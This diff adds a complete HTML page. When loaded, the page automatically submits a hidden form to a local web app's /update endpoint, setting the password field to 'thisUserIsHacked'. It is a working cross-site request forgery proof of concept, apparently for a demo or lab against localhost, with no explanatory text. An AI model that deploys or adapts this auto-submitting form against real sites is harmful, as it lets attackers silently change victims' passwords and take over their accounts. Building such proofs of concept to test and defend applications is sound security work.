@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8"/>
+    <title>Document</title>
+  </head>
+  <body>
+    <form action="http://localhost:8080/update" method="POST">
+      <input name="password" value="thisUserIsHacked"/>
+    </form>
+    <script>
+     var form = document.querySelector("form");
+     form.submit()
+    </script>
+  </body>
+</html>
